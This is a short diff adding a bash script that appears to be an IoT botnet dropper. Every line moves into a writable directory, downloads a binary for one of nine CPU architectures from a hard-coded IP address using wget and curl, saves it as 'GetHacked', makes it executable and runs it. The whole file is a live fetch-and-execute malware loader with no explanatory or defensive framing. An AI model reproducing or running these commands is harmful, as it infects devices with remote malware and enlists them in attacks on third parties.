@@ -1,0 +1,10 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.112/egirlnudes/egirl.x86; curl -O http://194.180.224.112/egirlnudes/egirl.x86;cat egirl.x86 >GetHacked;chmod +x *;./GetHacked x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.112/egirlnudes/egirl.mips; curl -O http://194.180.224.112/egirlnudes/egirl.mips;cat egirl.mips >GetHacked;chmod +x *;./GetHacked mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.112/egirlnudes/egirl.mpsl; curl -O http://194.180.224.112/egirlnudes/egirl.mpsl;cat egirl.mpsl >GetHacked;chmod +x *;./GetHacked mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.112/egirlnudes/egirl.arm4; curl -O http://194.180.224.112/egirlnudes/egirl.arm4;cat egirl.arm4 >GetHacked;chmod +x *;./GetHacked arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.112/egirlnudes/egirl.arm5; curl -O http://194.180.224.112/egirlnudes/egirl.arm5;cat egirl.arm5 >GetHacked;chmod +x *;./GetHacked arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.112/egirlnudes/egirl.arm6; curl -O http://194.180.224.112/egirlnudes/egirl.arm6;cat egirl.arm6 >GetHacked;chmod +x *;./GetHacked arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.112/egirlnudes/egirl.ppc; curl -O http://194.180.224.112/egirlnudes/egirl.ppc;cat egirl.ppc >GetHacked;chmod +x *;./GetHacked ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.112/egirlnudes/egirl.m68k; curl -O http://194.180.224.112/egirlnudes/egirl.m68k;cat egirl.m68k >GetHacked;chmod +x *;./GetHacked m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.112/egirlnudes/egirl.sh4; curl -O http://194.180.224.112/egirlnudes/egirl.sh4;cat egirl.sh4 >GetHacked;chmod +x *;./GetHacked sh4
